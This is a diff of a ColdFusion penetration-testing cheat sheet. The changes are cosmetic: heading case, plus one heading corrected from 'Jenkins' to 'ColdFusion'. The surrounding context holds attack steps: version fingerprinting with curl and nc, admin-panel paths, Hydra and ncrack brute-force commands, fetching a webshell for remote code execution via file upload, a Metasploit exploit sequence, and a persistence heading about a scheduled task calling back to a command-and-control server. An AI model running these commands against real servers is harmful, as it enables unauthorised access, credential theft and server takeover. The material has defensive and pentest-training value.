@@ -1,8 +1,8 @@
-### **INTRODUCTION**
+### **Introduction**
 
 ColdFusion is a commercial rapid web application development platform created by Allaire Corporation, which is now maintained by Adobe Systems. It consists of a programming language known as ColdFusion Markup Language (CFML), an integrated development environment (IDE), and a scalable server for developing and delivering web and mobile applications. ColdFusion is designed to simplify the connection between HTML pages and databases, as well as to assist in building dynamic websites with advanced features that interact with databases, manipulate file content, manage session state, and integrate with various web services.
 
-### **IDENTIFYING JENKINS VERSION**
+### **Identifying ColdFusion Version**
 
 1.  Obtaining Version Using URL Path Enumeration:  
     `curl -I http://[COLDFUSION-DOMAIN]/CFIDE/administrator/`
@@ -12,14 +12,14 @@ ColdFusion is a commercial rapid web application development platform created by
     `echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc [COLDFUSION-DOMAIN] 80`
     
 
-### **DEFAULT DIRECTORIES AND FILES COLDFUSION**
+### **Default Directories and Files ColdFusion**
 
 1.  Access admin panel:  
     `http://[COLDFUSION-DOMAIN]/CFIDE/administrator/index.cfm`
 2.  Checking for Accessible Scripts:  
     `http://[COLDFUSION-DOMAIN]/CFIDE/scripts/`
 
-### **BRUTE-FORCE COLDFUSION CREDENTIALS**
+### **Brute-Force ColdFusion Credentials**
 
 1.  Brute-Forcing with Hydra:  
     `hydra -l admin -P password_list.txt [COLDFUSION-URL] http-post-form "/CFIDE/administrator/index.cfm:cfadminPassword=^PASS^:F=incorrect"`
@@ -29,7 +29,7 @@ ColdFusion is a commercial rapid web application development platform created by
     `ncrack -p http-form-post://[COLDFUSION-URL]/CFIDE/administrator/index.cfm -U admin -P password_list.txt`
     
 
-### **REMOTE CODE EXECUTION VIA FILE UPLOAD**
+### **Remote Code Execution via File Upload**
 
 1.  Download the webshell.cfm from the GitHub repository:  
     `wget https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm`
@@ -52,7 +52,7 @@ ColdFusion is a commercial rapid web application development platform created by
     `http://10.11.1.10/output.txt`
     
 
-### **AUTOMATING EXPLOITATION WITH METASPLOIT**
+### **Automating Exploitation with Metasploit**
 
 1.  Launch Metasploit Framework Console:  
     `msfconsole`
@@ -67,7 +67,7 @@ ColdFusion is a commercial rapid web application development platform created by
 6.  Execute the Exploit:  
     `exploit`
 
-### **ESTABLISH PERSISTENCE**
+### **Establish Persistence**
 
 Add a scheduled task in ColdFusion to call back to a command and control server:
 
